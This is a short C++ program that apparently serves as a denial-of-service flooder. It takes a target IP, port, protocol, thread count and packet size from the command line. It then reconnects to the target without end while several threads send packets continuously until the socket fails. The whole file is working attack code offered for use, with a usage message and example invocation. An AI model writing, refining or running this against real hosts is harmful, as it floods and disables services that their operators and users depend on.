#include "vey.hpp"
#include "wsock.hpp"

#include <iostream>
#include <thread>
#include <vector>

void info(const char *programm) {
    std::cout << "usage: \n\t" << programm << " [ip] [port] [TCP/UDP] [THREADS=5] [PACKET_SIZE=1024]" << std::endl;
    std::cout << "exmaple: \n\t" << programm << " 192.168.0.1 152 TCP 5 2048" << std::endl;
}

using namespace std::string_literals;

int main(int argc, char *argv[]) {
    if (argc < 4) {
        info(argv[0]);
        return 1;
    }


    const char *ip = argv[1];
    const char *port = argv[2];
    int sock_type = 0;
    int threads = 5;
    int packet_size = 1024;

    if (argv[3] == "TCP"s) {
        sock_type = SOCK_STREAM;
    }
    else if (argv[3] == "UDP"s) {
        sock_type = SOCK_DGRAM;
    }
    else {
        info(argv[0]);
        return 1;
    }

    if (argc >= 5) {
        char* endptr = nullptr;
        threads = std::strtol(argv[4], &endptr, 10);
        if (endptr == argv[4]) {
            info(argv[0]);
            return 1;
        }
    }

    if (argc >= 6) {
        char* endptr = nullptr;
        packet_size = std::strtol(argv[5], &endptr, 10);
        if (endptr == argv[5]) {
            info(argv[0]);
            return 1;
        }
    }

    std::cout << "target on " << argv[3] << ":\n\t" << ip << ":" << port << "\n\t" << threads << " threads " << packet_size << " bytes packet size" << std::endl;

    std::vector<char> buff;
    buff.reserve(packet_size);


    while (true) {
        std::cout << "connecting..." << std::endl;
        int sock = create_socket(ip, port, sock_type);
        if (sock == -1 ) {
            std::cout << "socket not created restarting..." << std::endl;
            continue;
        }

        std::vector<std::thread> ths;
        ths.reserve(threads);

        for (int i = 0; i < threads; ++i) {
            ths.emplace_back([&buff, sock] {
                while (send(sock, buff.data(), buff.capacity(), 0) > 0);
                std::cout << "thread: " << std::this_thread::get_id() << " end work" << std::endl;
            });
        }

        for (auto& item : ths) {
            item.join();
        }

        closesock(sock);
    }


    return 0;
}
